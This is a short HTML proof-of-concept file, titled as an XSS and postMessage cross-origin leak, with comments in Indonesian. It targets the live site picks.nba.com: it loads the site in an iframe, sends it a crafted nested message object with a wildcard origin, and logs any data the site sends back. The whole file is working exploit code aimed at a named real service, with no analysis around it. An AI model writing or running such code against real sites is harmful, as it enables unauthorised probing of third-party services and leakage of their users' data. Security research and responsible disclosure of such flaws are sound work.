<!DOCTYPE html>
<html>
<body>
  <h1>XSS PoC - postMessage Cross-Origin Leak</h1>

  <iframe id="target" src="https://picks.nba.com" sandbox="allow-scripts allow-same-origin" style="width:800px;height:600px;"></iframe>

  <script>
    const frame = document.getElementById('target');

    // Kirim pesan saat iframe sudah siap
    frame.onload = function () {
      const payload = {
        payload: {
          instance: {
            sourceConfiguration: {
              options: {
                consentData: {},
                abTesting: {},
                diagnostics: {},
                multiplexing: {}
              }
            },
            fetchIdData: {
              refererInfo: {
                stack: [null]
              },
              abTesting: {},
              uaHints: {
                brands: [{}],
                fullVersionList: []
              },
              trueLink: {}
            }
          },
          instanceState: {
            knownInstances: [],
            multiplexing: {}
          }
        }
      };

      // Kirim postMessage ke iframe
      frame.contentWindow.postMessage(payload, "*");
    };

    // Terima balasan dari iframe
    window.addEventListener("message", function (event) {
      console.log("Response from picks.nba.com:", event.data);
    });
  </script>
</body>
</html>
